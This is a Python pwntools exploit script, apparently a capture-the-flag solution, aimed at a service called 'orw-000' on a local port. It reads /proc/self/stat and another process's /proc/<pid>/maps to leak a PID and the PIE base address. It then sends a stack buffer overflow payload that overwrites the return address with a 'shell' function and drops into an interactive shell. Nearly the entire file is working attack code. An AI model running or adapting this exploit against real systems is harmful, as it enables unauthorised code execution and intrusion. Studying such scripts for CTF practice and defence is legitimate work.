#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['gnome-terminal', '-e']

elf = context.binary = ELF(args.EXE or '../src/orw-000')

host = args.HOST or 'localhost'
port = int(args.PORT or 9101)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
r = []
for _ in range(3):
    r.append(start())

# FIND PID
# for i in range(3):
#     r[i].sendlineafter(b"> ", b"read /proc/self/stat")
#     r[i].recvline(0)

#     pid = r[i].recvall().split()[0]
#     info(pid)
#     r[i].close()

r[0].sendlineafter(b"> ", b"read /proc/self/stat")
r[0].recvline(0)

pid = int(r[0].recvall().split()[0])
info(f"PID: {pid}")

r[0].close()

target = pid + 4
info(f"TARGET PID: {target}")

r[1].sendlineafter(b"> ", f"read /proc/{target}/maps".encode())
r[1].recvline(0)

maps = r[1].recvall().splitlines()
pie = int(maps[0].split(b"-")[0], 16)

info(f"PIE: {hex(pie)}")

r[1].close()

payload = b"A" * 0x88 + p64(pie + elf.sym.shell)
payload = b"write " + payload + b" XYZ"

r[2].sendlineafter(b"> ", payload)

r[2].interactive()
